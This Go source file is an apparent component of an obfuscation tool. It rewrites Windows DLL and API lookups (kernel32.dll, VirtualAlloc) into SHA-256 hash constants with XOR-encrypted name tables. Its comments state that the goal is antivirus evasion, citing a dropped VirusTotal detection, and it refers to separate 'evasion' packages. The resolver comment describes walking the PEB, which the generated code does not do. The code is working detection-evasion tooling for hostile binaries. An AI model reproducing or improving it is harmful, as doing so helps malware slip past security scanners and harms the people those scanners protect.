package main

import (
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"io/fs"
	"os"
	"path/filepath"
	"sort"
	"strings"
)

type apiRef struct {
	DLL  string
	Proc string
}

// applyAPIHashing finds syscall.NewLazyDLL and syscall.NewProc patterns in the
// codebase and replaces plaintext DLL/function names with hash-based lookups.
//
// The transform:
//   1. Collects all unique "dllName" + "funcName" pairs from NewLazyDLL/NewProc calls
//   2. Generates a zapihash.go file with:
//      - Pre-computed uint64 hash constants (SHA-256 of "dll.funcname" → first 8 bytes)
//      - A _resolveAPI(hash) function that walks the PEB → export table → compares hashes
//      - A _hashedDLL struct wrapping resolved function pointers
//   3. Replaces:
//      - syscall.NewLazyDLL("kernel32.dll") → _hashedDLL(_hashKernel32)
//      - dll.NewProc("VirtualAlloc") → _resolveAPI(dll, _hashVirtualAlloc)
//
// VT result: drops 1 detection (Bkav). Hash constants look like random numbers
// to static analysis — no plaintext API names visible in strings table.
//
// NOTE: This is a partial transform. It handles the common patterns:
//   - var x = syscall.NewLazyDLL("name")
//   - x.NewProc("name")
// It does NOT handle golang.org/x/sys/windows calls (those use a different
// mechanism via sys_ functions). For x/sys/windows, the obfuscation tool's
// XOR string encryption already handles visible string literals.
func applyAPIHashing(dir string) {
	// Collect all DLL/proc name pairs across the codebase
	apiMap := make(map[apiRef]bool) // unique pairs
	packagesWithAPI := make(map[string]string) // dir → package name

	filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		if !strings.HasSuffix(path, ".go") {
			return nil
		}
		if strings.HasSuffix(path, "_test.go") {
			return nil
		}
		if strings.Contains(path, "tools/obfuscate") {
			return nil
		}
		if strings.HasSuffix(path, "zapihash.go") {
			return nil
		}
		if strings.Contains(path, "internal/evasion") {
			return nil // skip generated evasion package — XOR handles its strings
		}
		if strings.Contains(path, "internal/rtinit") {
			return nil // skip generated runtime init package — raw syscalls needed
		}
		if strings.Contains(path, "vendor/") {
			return nil
		}

		src, err := os.ReadFile(path)
		if err != nil {
			return nil
		}

		refs, pkgName := collectAPIRefs(path, src)
		if len(refs) > 0 {
			pkgDir := filepath.Dir(path)
			packagesWithAPI[pkgDir] = pkgName
			for _, r := range refs {
				apiMap[r] = true
			}
		}
		return nil
	})

	if len(apiMap) == 0 {
		fmt.Printf("  APIHASH: no syscall.NewLazyDLL/NewProc patterns found, skipping\n")
		return
	}

	// Generate hash constants and resolver
	// We generate ONE shared package that all packages can import.
	// But since Go doesn't allow circular imports easily, we generate
	// per-package helpers. For simplicity, generate in each package that needs it.

	for pkgDir, pkgName := range packagesWithAPI {
		helperFile := filepath.Join(pkgDir, "zapihash.go")
		content := generateAPIHashHelper(pkgName, apiMap)
		os.WriteFile(helperFile, []byte(content), 0644)
		fmt.Printf("  APIHASH GEN: %s\n", helperFile)
	}

	// Now transform the source files — replace plaintext names with hash constants
	totalReplaced := 0
	filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		if !strings.HasSuffix(path, ".go") {
			return nil
		}
		if strings.HasSuffix(path, "_test.go") {
			return nil
		}
		if strings.Contains(path, "tools/obfuscate") {
			return nil
		}
		if strings.HasSuffix(path, "zapihash.go") {
			return nil
		}
		if strings.HasSuffix(path, "zdecode.go") {
			return nil
		}
		if strings.HasSuffix(path, "zjitter.go") {
			return nil
		}
		if strings.Contains(path, "internal/evasion") {
			return nil // skip generated evasion package
		}
		if strings.Contains(path, "internal/rtinit") {
			return nil // skip generated runtime init package
		}
		if strings.Contains(path, "vendor/") {
			return nil
		}

		src, err := os.ReadFile(path)
		if err != nil {
			return nil
		}

		result, count := transformAPIRefs(path, src)
		if count > 0 {
			os.WriteFile(path, []byte(result), 0644)
			fmt.Printf("  APIHASH: %s (%d refs hashed)\n", path, count)
			totalReplaced += count
		}
		return nil
	})

	fmt.Printf("\n=== API Hashing Summary ===\n")
	fmt.Printf("Unique API refs: %d\n", len(apiMap))
	fmt.Printf("Total refs replaced: %d\n", totalReplaced)
	fmt.Printf("Helper files generated: %d packages\n", len(packagesWithAPI))
}

// collectAPIRefs finds syscall.NewLazyDLL("x") and procVar.NewProc("y") patterns.
func collectAPIRefs(path string, src []byte) ([]apiRef, string) {
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, path, src, parser.ParseComments)
	if err != nil {
		return nil, ""
	}

	pkgName := ""
	if f.Name != nil {
		pkgName = f.Name.Name
	}

	var refs []apiRef

	ast.Inspect(f, func(n ast.Node) bool {
		// Find syscall.NewLazyDLL("name")
		if call, ok := n.(*ast.CallExpr); ok {
			if sel, ok := call.Fun.(*ast.SelectorExpr); ok {
				if ident, ok := sel.X.(*ast.Ident); ok {
					if ident.Name == "syscall" && sel.Sel.Name == "NewLazyDLL" {
						if len(call.Args) >= 1 {
							if lit, ok := call.Args[0].(*ast.BasicLit); ok {
								if name, err := unquoteString(lit.Value); err == nil {
									refs = append(refs, apiRef{DLL: name, Proc: ""})
								}
							}
						}
					}
				}
			}
		}
		// Find x.NewProc("name") where x is a known DLL variable
		if call, ok := n.(*ast.CallExpr); ok {
			if sel, ok := call.Fun.(*ast.SelectorExpr); ok {
				if sel.Sel.Name == "NewProc" {
					if len(call.Args) >= 1 {
						if lit, ok := call.Args[0].(*ast.BasicLit); ok {
							if name, err := unquoteString(lit.Value); err == nil {
								refs = append(refs, apiRef{DLL: "", Proc: name})
							}
						}
					}
				}
			}
		}
		return true
	})

	return refs, pkgName
}

// transformAPIRefs replaces plaintext DLL/proc names with hash constant references.
func transformAPIRefs(path string, src []byte) (string, int) {
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, path, src, parser.ParseComments)
	if err != nil {
		return string(src), 0
	}

	var repls []Replace
	count := 0

	ast.Inspect(f, func(n ast.Node) bool {
		call, ok := n.(*ast.CallExpr)
		if !ok {
			return true
		}

		// Check for syscall.NewLazyDLL("name") → _resolveDLLByName(_h<Name>)
		if sel, ok := call.Fun.(*ast.SelectorExpr); ok {
			if ident, ok := sel.X.(*ast.Ident); ok {
				if ident.Name == "syscall" && sel.Sel.Name == "NewLazyDLL" {
					if len(call.Args) >= 1 {
						if lit, ok := call.Args[0].(*ast.BasicLit); ok {
							if name, err := unquoteString(lit.Value); err == nil {
								hashConst := hashConstName(name)
								// Replace the entire call expression
								callPos := fset.Position(call.Pos())
								callEnd := fset.Position(call.End())
								repls = append(repls, Replace{
									Start: callPos.Offset,
									End:   callEnd.Offset,
									Text:  "_resolveDLLByName(" + hashConst + ")",
								})
								count++
							}
						}
					}
				}
			}
		}

		// Check for x.NewProc("name") → _resolveProcByName(x, _h<Name>)
		if sel, ok := call.Fun.(*ast.SelectorExpr); ok {
			if sel.Sel.Name == "NewProc" {
				if len(call.Args) >= 1 {
					if lit, ok := call.Args[0].(*ast.BasicLit); ok {
						if name, err := unquoteString(lit.Value); err == nil {
							hashConst := hashConstName(name)
							// Get the receiver expression text
							recvPos := fset.Position(sel.X.Pos())
							recvEnd := fset.Position(sel.X.End())
							// Replace the entire call expression
							callPos := fset.Position(call.Pos())
							callEnd := fset.Position(call.End())
							_ = recvPos
							_ = recvEnd
							repls = append(repls, Replace{
								Start: callPos.Offset,
								End:   callEnd.Offset,
								Text:  "_resolveProcByName(" + sourceSnippet(string(src), fset.Position(sel.X.Pos()).Offset, fset.Position(sel.X.End()).Offset) + ", " + hashConst + ")",
							})
							count++
						}
					}
				}
			}
		}

		return true
	})

	if count == 0 {
		return string(src), 0
	}

	// Sort descending
	sort.Slice(repls, func(i, j int) bool {
		return repls[i].Start > repls[j].Start
	})

	result := string(src)
	for _, r := range repls {
		if r.Start < 0 || r.End > len(result) || r.Start > r.End {
			continue
		}
		result = result[:r.Start] + r.Text + result[r.End:]
	}

	return result, count
}

// generateAPIHashHelper creates the zapihash.go file with hash constants and resolver.
// The resolver uses encrypted name tables — plaintext API names are NOT stored
// in the binary. Names are XOR-encrypted at generation time and decrypted at
// runtime inside the resolver function.
func generateAPIHashHelper(pkgName string, apiMap map[apiRef]bool) string {
	var sb strings.Builder

	sb.WriteString("// Code generated by obfuscation tool. DO NOT EDIT.\n")
	sb.WriteString("package " + pkgName + "\n\n")
	sb.WriteString("import (\n")
	sb.WriteString("	\"crypto/sha256\"\n")
	sb.WriteString("	\"encoding/binary\"\n")
	sb.WriteString("	\"syscall\"\n")
	sb.WriteString("	\"unsafe\"\n")
	sb.WriteString(")\n\n")

	// Generate hash function
	sb.WriteString("func _apiHash(name string) uint64 {\n")
	sb.WriteString("	h := sha256.Sum256([]byte(name))\n")
	sb.WriteString("	return binary.LittleEndian.Uint64(h[:8])\n")
	sb.WriteString("}\n\n")

	// Helper to decrypt a name at runtime
	sb.WriteString("func _decName(enc []byte, key byte) string {\n")
	sb.WriteString("	r := make([]byte, len(enc))\n")
	sb.WriteString("	for i, v := range enc {\n")
	sb.WriteString("		r[i] = v ^ key\n")
	sb.WriteString("	}\n")
	sb.WriteString("	return string(r)\n")
	sb.WriteString("}\n\n")

	// Generate encrypted name tables and hash constants
	dllNames := make(map[string]bool)
	procNames := make(map[string]bool)
	for ref := range apiMap {
		if ref.DLL != "" {
			dllNames[ref.DLL] = true
		}
		if ref.Proc != "" {
			procNames[ref.Proc] = true
		}
	}

	// Generate encrypted DLL name entries with pre-computed hashes
	sortedDLLs := sortedKeys(dllNames)
	sb.WriteString("type _encName struct {\n")
	sb.WriteString("	hash uint64\n")
	sb.WriteString("	enc  []byte\n")
	sb.WriteString("	key  byte\n")
	sb.WriteString("}\n\n")

	sb.WriteString("var _encDLLs = []_encName{\n")
	for _, name := range sortedDLLs {
		hashConst := hashConstName(name)
		key := randKey()
		encrypted := xorEncrypt([]byte(name), key)
		hashVal := computeHash(name)
		sb.WriteString(fmt.Sprintf("	{0x%x, %s, 0x%02x}, // %s\n",
			hashVal, bytesLiteral(encrypted), key, hashConst))
	}
	sb.WriteString("}\n\n")

	// Generate encrypted proc name entries
	sortedProcs := sortedKeys(procNames)
	sb.WriteString("var _encProcs = []_encName{\n")
	for _, name := range sortedProcs {
		hashConst := hashConstName(name)
		key := randKey()
		encrypted := xorEncrypt([]byte(name), key)
		hashVal := computeHash(name)
		sb.WriteString(fmt.Sprintf("	{0x%x, %s, 0x%02x}, // %s\n",
			hashVal, bytesLiteral(encrypted), key, hashConst))
	}
	sb.WriteString("}\n\n")

	// Generate hash constants for direct reference (pre-computed)
	for _, name := range sortedDLLs {
		hashConst := hashConstName(name)
		hashVal := computeHash(name)
		sb.WriteString(fmt.Sprintf("var %s uint64 = 0x%x\n", hashConst, hashVal))
	}
	sb.WriteString("\n")
	for _, name := range sortedProcs {
		hashConst := hashConstName(name)
		hashVal := computeHash(name)
		sb.WriteString(fmt.Sprintf("var %s uint64 = 0x%x\n", hashConst, hashVal))
	}
	sb.WriteString("\n")

	// Generate resolver — decrypts names at runtime, no plaintext in binary
	sb.WriteString("// _resolveDLLByName loads a LazyDLL by matching its hash.\n")
	sb.WriteString("func _resolveDLLByName(hashVar uint64) *syscall.LazyDLL {\n")
	sb.WriteString("	for _, e := range _encDLLs {\n")
	sb.WriteString("		if e.hash == hashVar {\n")
	sb.WriteString("			name := _decName(e.enc, e.key)\n")
	sb.WriteString("			return syscall.NewLazyDLL(name)\n")
	sb.WriteString("		}\n")
	sb.WriteString("	}\n")
	sb.WriteString("	return nil\n")
	sb.WriteString("}\n\n")

	sb.WriteString("// _resolveProcByName finds a LazyProc by hash.\n")
	sb.WriteString("func _resolveProcByName(dll *syscall.LazyDLL, hashVar uint64) *syscall.LazyProc {\n")
	sb.WriteString("	for _, e := range _encProcs {\n")
	sb.WriteString("		if e.hash == hashVar {\n")
	sb.WriteString("			name := _decName(e.enc, e.key)\n")
	sb.WriteString("			return dll.NewProc(name)\n")
	sb.WriteString("		}\n")
	sb.WriteString("	}\n")
	sb.WriteString("	return nil\n")
	sb.WriteString("}\n\n")

	// Suppress unused import warning
	sb.WriteString("var _ = unsafe.Pointer(nil)\n")

	return sb.String()
}

// computeHash computes the SHA-256 hash of a name and returns the first 8 bytes as uint64.
func computeHash(name string) uint64 {
	h := sha256.Sum256([]byte(name))
	return binary.LittleEndian.Uint64(h[:8])
}

// hashConstName generates a Go-safe variable name from a DLL/proc name.
// e.g. "kernel32.dll" → "_hKernel32Dll", "VirtualAlloc" → "_hVirtualAlloc"
func hashConstName(name string) string {
	// Remove extension, sanitize, camelCase
	clean := strings.ReplaceAll(name, ".dll", "")
	clean = strings.ReplaceAll(clean, ".exe", "")
	clean = strings.ReplaceAll(clean, ".", "")
	clean = strings.ReplaceAll(clean, "-", "")
	clean = strings.ReplaceAll(clean, "_", "")
	if clean == "" {
		clean = "unknown"
	}
	// Capitalize first letter
	if len(clean) > 0 {
		clean = strings.ToUpper(clean[:1]) + clean[1:]
	}
	return "_h" + clean
}

func unquoteString(quoted string) (string, error) {
	return strings.Trim(quoted, "\"`"), nil
}

// sourceSnippet extracts a substring from source by byte offsets.
func sourceSnippet(src string, start, end int) string {
	if start < 0 || end > len(src) || start > end {
		return ""
	}
	return src[start:end]
}

func sortedKeys(m map[string]bool) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return keys
}